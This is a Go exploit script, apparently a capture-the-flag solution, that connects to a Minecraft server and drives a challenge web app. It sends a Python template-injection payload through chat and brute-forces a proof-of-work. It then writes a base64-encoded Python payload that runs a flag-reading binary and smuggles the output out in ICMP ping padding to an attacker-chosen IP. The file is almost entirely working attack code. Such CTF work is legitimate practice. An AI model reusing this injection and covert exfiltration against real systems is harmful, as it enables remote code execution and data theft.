/**
* @Author: impakho
* @Date: 2020/04/12
* @Github: https://github.com/impakho
 */

package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"
)

const COPYRIGHT_AUTHOR = "impakho"
const COPYRIGHT_DATE = "2020/04/12"
const COPYRIGHT_GITHUB = "https://github.com/impakho"

// PLEASE MODIFY THIS
const MINECRAFT_ADDR = "134.175.230.10:25565"
const WEB_PROXY_ADDR = "http://127.0.0.1:9090"
const CHALLENGE_URL = "http://172.20.10.166:80"
const YOUR_ICMP_RECEIVER_MACHINE_IP = "127.0.0.1"
const PLAYER_NAME = "Steve"

const DEBUG = false
var jar *cookiejar.Jar
var connection net.Conn
var connDataBuffer = make([]byte, 0)
var connDataLock sync.Mutex
type Message struct {
	Text string
	Extra []Message
}
var MessageBuffer = ""
var logFileName string

func main() {
	fmt.Println("[mc_logclient] exploit")
	go HandleConnData()
	Solution()
}

func Solution() {
	jar, _ = cookiejar.New(nil)
	proxyUrl, err := url.Parse(WEB_PROXY_ADDR)
	if err != nil {
		log.Fatal(err)
	}
	httpClient := &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxyUrl)}, Jar: jar}

	payload := `from subprocess import *
import os
p=Popen(["/bin/bash", "-c", "trap '' 14 && /readflag"],stdout=PIPE,stdin=PIPE)
r=p.stdout
r.readline()
os.system("/bin/ping -W 1 -c 1 -p "+p.communicate((str(eval(r.readline()))+'\n').encode())[0][24:].hex()+" ` + YOUR_ICMP_RECEIVER_MACHINE_IP +`")`
	payload = "p exec(__import__(\"base64\").b64decode(\"" + base64.StdEncoding.EncodeToString([]byte(payload)) + "\"))"
	fmt.Println(payload)
	for {

		fmt.Println("login to minecraft")

		var err error
		connection, err = net.Dial("tcp", MINECRAFT_ADDR)
		if err != nil {
			log.Fatal(err)
		}

		// Read Conn Data
		go func() {
			for {
				buff := make([]byte, 4096)
				n ,err := connection.Read(buff)
				if err != nil {
					connection.Close()
					break
				}
				buff = buff[:n]
				connDataLock.Lock()
				connDataBuffer = append(connDataBuffer, buff...)
				connDataLock.Unlock()
				if DEBUG {
					fmt.Println(hex.Dump(buff))
				}
			}
		}()

		var data []byte

		data = Handshake()
		connection.Write(data)
		fmt.Println(hex.Dump(data))

		data = LoginStart()
		connection.Write(data)
		fmt.Println(hex.Dump(data))

		time.Sleep(1 * time.Second)

		data = ClientSettings()
		connection.Write(data)
		fmt.Println(hex.Dump(data))

		data = PluginMessage()
		connection.Write(data)
		fmt.Println(hex.Dump(data))

		time.Sleep(1 * time.Second)

		fmt.Println("read start")
		text := pow(httpClient, false)
		if text == "" {
			fmt.Println("pow fail, retry...")
			continue
		}
		fmt.Println(text)

		result := SendMessage(connection, "/uuid")
		logFileName = strings.Trim(strings.Split(result, " ")[1], "\n")
		fmt.Println(logFileName)

		data = ChatMessage("/{{[].__class__.__base__.__subclasses__()[133].__init__.__globals__['sys']['breakpointhook']()}}")
		connection.Write(data)

		resp, err := httpClient.Get(CHALLENGE_URL + "/read" + fmt.Sprintf("?work=%s&filename=%s", url.QueryEscape(text[len(text)-4:]), url.QueryEscape(logFileName)))
		if err != nil {
			log.Fatal(err)
		}

		urls, err := url.Parse(CHALLENGE_URL)
		if err != nil {
			log.Fatal(err)
		}
		jar.SetCookies(urls, resp.Cookies())

		connection.Close()

		fmt.Println("read end")
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(string(body))

		fmt.Println("write start")
		text = pow(httpClient, true)
		if text == "" {
			fmt.Println("pow timeout, retry...")
			continue
		}
		fmt.Println(text)
		resp, err = httpClient.Get(CHALLENGE_URL + "/write" + fmt.Sprintf("?work=%s&text=%s", url.QueryEscape(text[len(text)-4:]), url.QueryEscape(payload)))
		if err != nil {
			log.Fatal(err)
		}

		urls, err = url.Parse(CHALLENGE_URL)
		if err != nil {
			log.Fatal(err)
		}
		jar.SetCookies(urls, resp.Cookies())

		fmt.Println("write end")
		body, err = ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(string(body))

		break
	}
}

func pow(client *http.Client, timeout bool) string {
	resp, err := client.Get(CHALLENGE_URL + "/pow")
	if err != nil {
		log.Fatal(err)
	}

	urls, err := url.Parse(CHALLENGE_URL)
	if err != nil {
		log.Fatal(err)
	}
	jar.SetCookies(urls, resp.Cookies())

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	response := make(map[string]string, 0)
	err = json.Unmarshal(body, &response)
	fmt.Println(string(body), response)
	if err != nil {
		log.Fatal(err)
	}
	nowTime := time.Now().UnixNano()
	table := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	for _, c1 := range table {
		for _, c2 := range table {
			for _, c3 := range table {
				for _, c4 := range table {
					fullText := fmt.Sprintf("%s%c%c%c%c", response["text"], c1, c2, c3, c4)
					if fmt.Sprintf("%x", Sha256([]byte(fullText))) == response["hash"] {
						return fullText
					}
					if timeout && time.Now().After(time.Unix(0, nowTime).Add(15 * time.Second)) {
						return ""
					}
				}
			}
		}
	}
	return ""
}

func HandleConnData() {
	length := VarInt(0)
	pkt := make([]byte, 0)
	for {
		connDataLock.Lock()
		if len(connDataBuffer) > 0 {
			pkt = append(pkt, connDataBuffer...)
			connDataBuffer = make([]byte, 0)
		}
		connDataLock.Unlock()
		// Handle Data by Length
		buffer := bytes.NewBuffer(pkt)
		err := length.Decode(buffer)
		if err != nil {
			time.Sleep(10 * time.Millisecond)
			continue
		}
		b := buffer.Bytes()
		if length <= 0 {
			pkt = pkt[1:]
		}
		if length > 0 && length <= VarInt(len(b)) {
			go HandlePacket(connection, b[:length][:])
			pkt = pkt[int64(len(pkt) - len(b)) + int64(length):]
		}
	}
}

func SendMessage(conn net.Conn, msg string) string {
	MessageBuffer = ""
	data := ChatMessage(msg)
	conn.Write(data)
	timeout := 0
	for {
		if len(MessageBuffer) > 0 {
			time.Sleep(1 * time.Second)
			tmp := MessageBuffer
			MessageBuffer = ""
			return tmp
		}
		if timeout >= 30 {
			break
		}
		timeout++
		time.Sleep(100 * time.Millisecond)
	}
	return ""
}

func HandlePacket(conn net.Conn, packet []byte) {
	/* keep-alive
	References:
		https://wiki.vg/index.php?title=Protocol&oldid=13223#Keep_Alive_.28serverbound.29
		https://wiki.vg/index.php?title=Protocol&oldid=13223#Keep_Alive_.28clientbound.29
	*/
	if packet[0] == 0x1f {
		// send keep-alive response
		pkt := make([]byte, 0)
		pkt = append(pkt, 0x0c)
		pkt = append(pkt, packet[1:]...)
		pkt = append(VarInt(len(pkt)).Encode(), pkt...)
		conn.Write(pkt)
		if DEBUG {
			fmt.Println(hex.Dump(pkt))
		}
		return
	}
	/* chat message
	Reference: https://wiki.vg/index.php?title=Protocol&oldid=13223#Chat_Message_.28clientbound.29
	*/
	if packet[0] == 0x0f {
		var json_str String
		err := json_str.Decode(bytes.NewBuffer(packet[1:len(packet) - 1]))
		if err != nil {
			return
		}
		var message Message
		err = json.Unmarshal([]byte(json_str), &message)
		if err != nil {
			return
		}
		text := message.Text
		for _, k := range message.Extra {
			text += k.Text
		}
		MessageBuffer += text + "\n"
		return
	}
}

func Handshake() []byte {
	// Reference: https://wiki.vg/index.php?title=Protocol&oldid=13223#Handshake
	id := []byte{0x00}
	protocol_version := VarInt(997).Encode()
	ip, port, err := ParseAddr(MINECRAFT_ADDR)
	if err != nil {
		return nil
	}
	server_address := String(ip).Encode()
	server_port := UnsignedShort(port).Encode()
	state := []byte{0x02}
	pkt := make([]byte, 0)
	pkt = append(pkt, id...)
	pkt = append(pkt, protocol_version...)
	pkt = append(pkt, server_address...)
	pkt = append(pkt, server_port...)
	pkt = append(pkt, state...)
	pkt = append(VarInt(len(pkt)).Encode(), pkt...)
	return pkt
}

func LoginStart() []byte {
	// Reference: https://wiki.vg/index.php?title=Protocol&oldid=13223#Login_Start
	id := []byte{0x00}
	name := String(PLAYER_NAME).Encode()
	pkt := make([]byte, 0)
	pkt = append(pkt, id...)
	pkt = append(pkt, name...)
	pkt = append(VarInt(len(pkt)).Encode(), pkt...)
	return pkt
}

func ClientSettings() []byte {
	// Reference: https://wiki.vg/index.php?title=Protocol&oldid=13223#Client_Settings
	id := []byte{0x05}
	locale := String("en_us").Encode()
	view_distance := Byte(12).Encode()
	chat_mode := VarInt(0).Encode()
	chat_colors := Boolean(true).Encode()
	displayed_skin_parts := UnsignedByte(0x7f).Encode()
	main_hand := VarInt(1).Encode()
	pkt := make([]byte, 0)
	pkt = append(pkt, id...)
	pkt = append(pkt, locale...)
	pkt = append(pkt, view_distance...)
	pkt = append(pkt, chat_mode...)
	pkt = append(pkt, chat_colors...)
	pkt = append(pkt, displayed_skin_parts...)
	pkt = append(pkt, main_hand...)
	pkt = append(VarInt(len(pkt)).Encode(), pkt...)
	return pkt
}

func PluginMessage() []byte {
	// Reference: https://wiki.vg/index.php?title=Protocol&oldid=13223#Plugin_Message_.28serverbound.29
	id := []byte{0x0A}
	channel := String("MC|Brand").Encode()
	data := ByteArray([]byte("vanilla")).Encode()
	pkt := make([]byte, 0)
	pkt = append(pkt, id...)
	pkt = append(pkt, channel...)
	pkt = append(pkt, data...)
	pkt = append(VarInt(len(pkt)).Encode(), pkt...)
	return pkt
}

func ChatMessage(str string) []byte {
	// Reference: https://wiki.vg/index.php?title=Protocol&oldid=13223#Chat_Message_.28serverbound.29
	id := []byte{0x03}
	message := String(str).Encode()
	pkt := make([]byte, 0)
	pkt = append(pkt, id...)
	pkt = append(pkt, message...)
	pkt = append(VarInt(len(pkt)).Encode(), pkt...)
	return pkt
}

func ParseAddr(addr string) (ip string, port uint16, err error) {
	sep := strings.Split(addr, ":")
	tip := net.ParseIP(sep[0])
	tport, err := strconv.Atoi(sep[1])
	if tip == nil || err != nil || tport < 1 || tport > 65535 {
		return ip, port, errors.New("invalid addr format")
	}
	return tip.String(), uint16(tport), nil
}

func Sha256(bytes []byte) []byte {
	sum := sha256.Sum256(bytes)
	return sum[:]
}